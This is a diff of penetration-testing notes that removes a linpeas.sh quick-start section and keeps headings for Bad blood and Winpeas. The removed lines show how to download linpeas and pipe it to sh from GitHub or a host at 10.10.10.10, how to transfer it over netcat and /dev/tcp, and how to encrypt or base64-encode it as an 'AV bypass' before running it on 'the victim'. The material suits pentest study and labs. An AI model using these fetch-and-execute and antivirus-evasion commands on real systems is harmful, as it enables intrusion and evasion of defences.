@@ -139,44 +139,7 @@ Plumhound -
 
 Bad blood - create domain for your \(defense tool, or lab setup\) fills AD with objects, don't use in production! \(cant create sessions\)
 
-## `linpeas.sh`
-
-Quick Start
-
-#### From github
-
-`curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh`
-
-#### Local network
-
-`sudo python -m SimpleHTTPServer 80` `curl 10.10.10.10/linpeas.sh | sh`
-
-#### Without curl
-
-`sudo nc -q 5 -lvnp 80 < linpeas.sh` `cat < /dev/tcp/10.10.10.10/80 | sh`
-
-#### Output to file
-
-`linpeas -a > /dev/shm/linpeas.txt` -a to execute all the checks.
-
-`less -r /dev/shm/linpeas.txt #Read with colors`
-
-#### AV bypass
-
-#### open-ssl encryption
-
-`openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc` `sudo python -m SimpleHTTPServer 80` \#Start HTTP server `curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh` \# Download from the victim
-
-#### Base64 encoded
-
-```text
-#Start HTTP server 
-base64 -w0 linpeas.sh > lp.enc sudo python -m SimpleHTTPServer 80 
-#Download from the victim Use the parameter 
-curl 10.10.10.10/lp.enc | base64 -d | sh
-```
-
-### Winpeas
+## Winpeas
 
 #### Windows icacls file permissions
 
